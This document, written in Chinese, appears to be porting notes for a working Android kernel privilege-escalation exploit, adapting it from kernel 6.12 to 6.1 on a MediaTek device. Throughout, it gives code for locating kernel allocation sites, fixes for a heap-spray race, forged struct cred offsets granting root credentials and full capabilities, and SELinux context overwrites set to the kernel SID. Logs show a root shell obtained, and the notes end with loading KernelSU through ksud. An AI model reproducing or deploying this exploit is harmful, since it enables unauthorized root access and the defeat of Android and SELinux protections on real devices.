# 移植补丁说明 — 从 6.12.69 到 6.1.129

上游 `YuKongA/CVE-2026-98260` 只支持：
- `6.12.69-android16-6-g242e1a07f878-ab15865446-4k`
- `6.12.69-android16-6-g5fd39602326e-ab16372235-4k`

使其在 `6.1.129-android14-11-g6b7a9f51c088-ab13432504`（MT6878 / lapis）上工作，需要 4 处修改。

---

## 补丁 1 — extractor 的 `task_struct` 分配点回退链

**文件**：`tools/extract/src/derive.rs`

### 现象

```
info: kallsyms layout pre-6.4 recovered (101575 symbols)
error: copy_process: no kmem_cache_alloc(task_struct_cachep) call
```

### 原因

上游在 `copy_process` 的函数体内搜索对 `task_struct_cachep` 的分配调用。
6.1 里这个调用位于 `dup_task_struct()` → `alloc_task_struct_node()`，**没有**内联进 `copy_process`。

### 修改

```rust
let task_struct_cachep = syms.require("task_struct_cachep")?;
let task_alloc_fns: Vec<u64> = [
    "kmem_cache_alloc_node_noprof",
    "kmem_cache_alloc_node",
    "kmem_cache_alloc_noprof",
    "kmem_cache_alloc",
].iter().filter_map(|name| syms.rel(name)).collect();

let mut task_site: Option<u64> = None;
for fname in ["copy_process", "dup_task_struct",
              "alloc_task_struct_node", "kernel_clone"] {
    let Some(frel) = syms.rel(fname) else { continue };
    let Ok(code) = disassemble_function(&boot.kernel, frel, syms.extent(frel)) else { continue };
    if let Some(site) = find_cache_alloc_site(&code, task_struct_cachep, &task_alloc_fns) {
        task_site = Some(site);
        break;
    }
}
```

本机命中于 `dup_task_struct`。

---

## 补丁 2 — `wait_zombie` 超时（最关键）

**文件**：`timer/timer.c`

### 现象

```
[dbg] go write=1 errno=11
[dbg] wait_zombie rc=-1 si_pid=0 code=0 status=0
[-] plant1 no zombie; holding child
```

go 信号已发出，但子进程在 0.4 秒内没有被 SIGKILL。

### 原因

```c
struct timespec pause = {.tv_nsec = 200000};
for (int i = 0; i < 2000; i++)   /* 2000 × 0.2ms = 0.4 秒 */
```

BSP 内核上 `execve` + POSIX timer 清理耗时更长，0.4 秒不够。

### 修改

```c
/* BSP 内核上 exec + posix timer 清理耗时更长，放宽到 ~12s */
for (int i = 0; i < 60000; i++)   /* 60000 × 0.2ms = 12 秒 */
```

改后：

```
[dbg] wait_zombie rc=0 si_pid=4038 code=2 status=9
[+] plant1 free_seen=1 burst hit=1 after 22ms
[+] cred writes landed, waking child
uid=0(root) ... ROOT_SHELL_OK
```

---

## 补丁 3 — spray 线程 phase0 死锁

**文件**：`timer/timer.c` `spray_thread()`

### 现象

失败分支下 `pthread_join` 永久挂住：

```
timer 主线程  futex_wait_queue      ← 卡在 pthread_join
8 个喷射线程  state=R (空转)         ← 永不退出
```

### 原因

```c
while (!atomic_load(&g_burst))     /* g_burst 只在成功路径设置 */
    sched_yield();
```

失败分支只设 `g_stop_spray` / `g_burst2`，不设 `g_burst` → phase0 永不退出。

### 修改

```c
while (!atomic_load(&g_burst) && !atomic_load(&g_stop_spray))
    sched_yield();
```

---

## 补丁 4 — fake cred 的字段偏移（2 个子项）

**文件**：`timer/timer.c`

### 根因

`struct cred` 的第一个字段：

| 内核 | 类型 | 大小 |
|---|---|---|
| 6.12（上游假设） | `atomic_long_t usage` | 8 字节 |
| **6.1（本机）** | **`atomic_t usage`** | **4 字节** |

导致后面**所有字段整体前移 8 字节**。

本机 BTF 实测：

```
+0x078  security       ← 真实位置
+0x080  user
+0x088  user_ns
+0x090  ucounts
+0x098  group_info
```

而上游写的是 `security@0x80, user@0x88, ...` —— 于是 `user` 被写成一个指向 blob 的指针，
子进程 `execve` 时解引用 `cred->user_ns` 立刻 **内核 panic**。

### 修改 4a — 指针偏移 -8

```c
*(unsigned long long *)(payload + off + 0x78) = page + blob;              /* security */
*(unsigned long long *)(payload + off + 0x80) = ROOT_USER_STATIC   + g_slide;
*(unsigned long long *)(payload + off + 0x88) = INIT_USER_NS_STATIC + g_slide;
*(unsigned long long *)(payload + off + 0x90) = INIT_UCOUNTS_STATIC + g_slide;
*(unsigned long long *)(payload + off + 0x98) = INIT_GROUPS_STATIC  + g_slide;
```

### 修改 4b — caps 循环索引

`c[]` 是 `unsigned long long *`，位于 `payload + off`，即 `c[i]` 对应 `off + 8*i`。

| 索引 | 6.12 含义 | **6.1 实际含义** |
|---|---|---|
| c[5] | securebits | **cap_inheritable** |
| c[6] | cap_inheritable | **cap_permitted** |
| c[7] | cap_permitted | **cap_effective** |
| c[8] | cap_effective | **cap_bset** |
| c[9] | cap_bset | **cap_ambient** |
| c[10] | cap_ambient | **jit_keyring / keyring 指针区** |

```c
/* 6.1: c[5..9] = cap_inh/prm/eff/bset/ambient；c[10] 是 keyring 指针区，
 * 绝对不能写 FULLCAP。 */
for (int i = 5; i <= 9; i++)
    c[i] = FULLCAP;
```

### 修改 4c — SELinux blob 全字段填 kernel SID

`struct task_security_struct`（本机 BTF，size 0x18）：

```
+0x00 osid   +0x04 sid   +0x08 exec_sid
+0x0C create_sid   +0x10 keycreate_sid   +0x14 sockcreate_sid
```

上游只写 `+8/+12`（exec_sid / create_sid），`sid` 留在 0（无效值）→ 崩溃。

```c
for (int bi = 0; bi < 6; bi++)
    *(unsigned int *)(payload + blob + bi * 4) = SELINUX_SID_KERNEL;
```

---

## 补丁 5 — fake 链的 fd 通信（本机适配）

**文件**：`timer/timer.c`

### 现象

子进程在 `read(3)` 等待唤醒，但始终不醒；父进程 `poll(st_fd)` 拿不到报告。

### 原因

1. `wait_child_main` 使用硬编码 fd 3/4，经 `execve` 后行为不可靠
2. 子进程 `close(3)` 后，父进程再 `write(go_fd)` 触发 **SIGPIPE**，父进程被杀

### 修改

fake 模式下完全绕开 fd 通信，改用**子进程轮询自己的 uid** 作为同步信号
（cred 一被写入，`getuid()` 立刻变 0）：

```c
if (!strcmp(mode, "fake")) {
    int spins = 0;
    while ((int)syscall(SYS_getuid) != 0) {
        usleep(2000);
        if (++spins > 15000) _exit(132);   /* 30s */
    }
} else if (read(3, &ch, 1) != 1) {
    _exit(131);
}
```

父进程侧：

```c
if (!g_fake_stage) {
    if (write(go_fd, "A", 1) != 1) logf("[!] child wake write failed\n");
} else {
    logf("[+] fake mode: fd wake skipped (child polls its own uid)\n");
}
```

同理跳过 `poll(st_fd)`。

---

## 补丁 6 — KMI 字符串与 ksud 版本

**文件**：`timer/timer.c` `write_ksu_script()`

```c
/* 上游 */
"\"$KSUD\" late-load --kmi android16-6.12 --allow-shell "
/* 本机 */
"\"$KSUD\" late-load --kmi android14-6.1 --allow-shell "
```

KMI 命名规则是 `<android 版本>-<内核版本>`，不是内核 version string 里的 `android14-11`。

同时：**ksud 必须 ≥ 3.3.1**。旧版 3.1.0 的 `late-load` 不接受 `--kmi`：

```
Usage: ksud late-load
[ksu] late-load rc=2
KSU_MISSING
```
